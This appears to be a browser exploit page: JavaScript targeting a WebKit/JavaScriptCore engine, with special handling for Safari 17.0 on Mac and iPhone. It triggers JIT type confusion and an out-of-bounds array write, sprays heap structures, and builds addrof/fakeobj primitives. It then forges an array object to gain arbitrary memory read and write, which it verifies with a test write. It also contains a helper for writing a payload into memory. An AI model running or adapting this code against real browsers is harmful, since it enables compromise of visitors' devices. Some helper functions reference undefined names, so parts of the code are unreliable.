
<!DOCTYPE html>
<html>
<body>
<script src="./util.js"></script>
<script src="./int64.js"></script>
<script>

var datePrototype = undefined;

const ITERATIONS = 100000;
const MAX_ITERATIONS = 0xc0000;

let noCoW = 13.37;
let arr = [noCoW, 2.2, 3.3];
let oobArr = [noCoW, 2.2, 3.3];
let objArr = [{}, {}, {}];

function hexx(i)
{
    return "0x"+i.toString(16).padStart(16, "0");
}

function MakeJitCompiledFunction() {
    function target(num) {
        for (var i = 2; i < num; i++) {
            if (num % i === 0) {
                return false;
            }
        }
        return true;
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    return target;
}

var jitFunc = MakeJitCompiledFunction();

function Foo(arr, n)
{
    n = n | 0;
    if(n<0) {
        let v = (-n) | 0;
        let idx = Math.abs(n);
        if(idx < arr.length) {
            if(idx & 0x80000000) {
                idx += -0x7ffffffd;  // idx = 3;
            }
            if(idx>0) {
                return arr[idx] = 1.04380972981885e-310;  // i2f(0x133700001337);
            }
        }
    }
}

for(let i=0; i<MAX_ITERATIONS; i++) {
	let tmp = -2;
	Foo(arr, tmp);
}

Foo(arr, -2147483648);

document.write("<h1>oob arr: " + (oobArr.length) + "</h1>");

const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);

function f2i(val)
{ 
    f64[0] = val;
    return u32[1] * 0x100000000 + u32[0];
}

function i2f(val)
{
    let tmp = [];
    tmp[0] = parseInt(val % 0x100000000);
    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
    u32.set(tmp);
    return f64[0];
}

function i2obj(val)
{
    return i2f(val-0x02000000000000);
}

function floatToInt(float) {
	arr64[0] = float;
	return arr[0] + arr[1] * 2**32;
}

function intToFloat(int) {
	arr[0] = int;
	arr[1] = Math.floor(int/2**32);
	return arr64[0];
}

function str2ab(str) {
    var array = new Uint8Array(str.length);
    for(var i = 0; i < str.length; i++) {
        array[i] = str.charCodeAt(i);
    }
    return array.buffer
}

function gc() {
    for (let i = 0; i < 0x10; i++) {
        new ArrayBuffer(0x1000000)
    }
}

var structs = [];
function sprayStructures() {
    for (var i = 0; i < 1000; i++) {
        var a = [13.37];
        a['prop'] = 13.37;
        a['prop' + i] = 13.37;
        structs.push(a);
    }
}

let boxed_arr = new Function();
boxed_arr.p1 = 1.1;
boxed_arr[0] = {};
let getter = new Function();
getter.p1 = 1.1;
getter[0] = 1.1;
let shape = {};
for (let i = 0; i < 14; ++i) {
    shape['p'+i] = i;
}
let shapes = [];
for (let i = 0; i < 0x1000; ++i) {
    shapes.push({
        ...shape,
        ['z'+i]: 0x1337
    });
}

function trigger(type) {
    let object_a = {};
    object_a.foo = 1;
    object_a.p1 = 1.1;
    let object_b = {};
    object_b.__defineGetter__('p1', getter);
    object_b.foo = 1;
    function get_getterSetter(type) {
        let o, retval;
        if (type == 0) o = object_a;
        else o = object_b;
        for (let i = 0; i < 2; ++i) {
            if (type == 0) retval = o.foo;
            else retval = o.foo;
        }
        return retval;
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    return [getter, get_getterSetter(1)];
}

(function pwn() {
    gc();
    var getter, getterSetter;
    for (let i = 1; i <= ITERATIONS; i++) {
        [getter, getterSetter] = trigger();
        try {
            getterSetter.toString();
        } catch(e) {
            break;
        }
    }
    if (getterSetter == undefined) {
        document.write("<h1>Failed to trigger getterSetter!</h1>");
        return;
    }
    document.write("<h1>Triggered getterSetter!</h1>");
    let symbolObject = Object(getterSetter);
    let isMac = navigator.userAgent.indexOf('Macintosh;') !== -1;
    let isIphone = navigator.userAgent.indexOf('iPhone;') !== -1;
    let version = navigator.userAgent.split('Version/')[1].split(' ')[0];
    let factor;
    let unknown_device = false;
    if (isMac && version == '17.0') {
        factor = 840;
    } else if (isIphone && version == '17.0') {
        factor = 87;
    } else {
        factor = 87 + Math.floor(Math.random() * 1000);
        unknown_device = true;
    }
    document.write("<h1>factor: " + factor + "</h1>");
    let ref_arr = [];
    for (let i = 0; i < factor; ++i) {
        ref_arr.push(symbolObject.description);
    }
    getter.p13 = 1.1;
    let unboxed_arr = getter;
    function addrof(o) {
        boxed_arr[8] = o;
        return Int64.fromDouble(unboxed_arr[0]);
    }
    function fakeobj(addr) {
        unboxed_arr[0] = addr.asDouble();
        return boxed_arr[8];
    }
    function isVulnerable() {
        let base = addrof({}).asDouble();
        if (!isNaN(base)) {
            let base_fake = fakeobj(Int64.fromDouble(base));
            if (base_fake.__proto__ == Object.prototype) {
                let t = {b: 42};
                let a = addrof(t);
                if (fakeobj(addrof(t)) !== t) {
                    return false;
                } else {
                    return true;
                }
            }
        }
        return false;
    }
    if (isVulnerable()) {
        document.write("<h1>Passed addrof and fakeobj check!</h1>");
        function LeakStructureID(obj)
        {
            let container = {
                cellHeader: i2obj(0x0108200700000000),
                butterfly: obj
            };
            let fakeObjAddr = Add(addrof(container), 0x10);
            let fakeObj = fakeobj(fakeObjAddr);
            f64[0] = fakeObj[0];
            let structureID = u32[0];
            u32[1] = 0x01082307 - 0x20000;
            container.cellHeader = f64[0];
            return structureID;
        }
        var arrLeak = new Array(noCoW, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8);
        let structureID = LeakStructureID(arrLeak);
        document.write("<h1>StructureID: " + hexx(structureID) + "</h1>");
        pad = [{}, {}, {}];
        var victim = [noCoW, 14.47, 15.57];
        victim['prop'] = 13.37;
        victim['prop_1'] = 13.37;
        u32[0] = structureID;
        u32[1] = 0x01082309-0x20000;
        var container = {
            cellHeader: f64[0],
            butterfly: victim   
        };
        var containerAddr = addrof(container);
        document.write("<h1>Container addr: " + containerAddr + "</h1>");
        var fakeArrAddr = Add(containerAddr, 0x10);
        document.write("<h1>Fake arr addr: " + fakeArrAddr + "</h1>");
        var driver = fakeobj(fakeArrAddr);
        var unboxed = [noCoW, 13.37, 13.37];
        var boxed = [{}];
        driver[1] = unboxed;
        var sharedButterfly = victim[1];
        document.write("<h1>Shared butterfly addr: " + hexx(f2i(sharedButterfly)) + "</h1>");
        driver[1] = boxed;
        victim[1] = sharedButterfly;
        u32[0] = structureID;
        u32[1] = 0x01082307-0x20000;
        container.cellHeader = f64[0];
        function NewAddrOf(obj) {
            boxed[0] = obj;
            return f2i(unboxed[0]);
        }
        function NewFakeObj(addr) {
            unboxed[0] = i2f(addr);
            return boxed[0];            
        }
        function Read64(addr) {
            driver[1] = i2f(addr+0x10);
            return NewAddrOf(victim.prop);
        }
        function Write64(addr, val) {
            driver[1] = i2f(addr+0x10);
            victim.prop = i2f(val);
        }
        function ByteToDwordArray(payload)
        {
            let sc = []
            let tmp = 0;
            let len = Math.ceil(payload.length/6)
            for (let i = 0; i < len; i += 1) {
                tmp = 0;
                pow = 1;
                for(let j=0; j<6; j++){
                    let c = payload[i*6+j]
                    if(c === undefined) {
                        c = 0;
                    }
                    pow = j==0 ? 1 : 256 * pow;
                    tmp += c * pow;
                }
                tmp += 0xc000000000000;
                sc.push(tmp);
            }
            return sc;
        }
        function ArbitraryWrite(addr, payload) 
        {
            let sc = ByteToDwordArray(payload);
            for(let i=0; i<sc.length; i++) {
                Write64(addr+i*6, sc[i]);
            }
        }
        let Test = [{
            a: 13.37
        }];
        let TestAddr = NewAddrOf(Test);
        let TestBefore = Read64(TestAddr);
        Write64(TestAddr, 0x90);
        let TestAfter = Read64(TestAddr);
        if(hex(TestAfter) == "90") {
            document.write("<h1>Arbitrary write success!</h1>");
            // We now have arbitrary read/write primitives :)
        } else {
            document.write("<h1>Arbitrary write failed!</h1>");
            location.reload();
            return;
        }
    } else {
        document.write("<h1>Failed addrof and fakeobj check!</h1>");
        location.reload();
        return;
    }
})();

</script>
</body>
</html>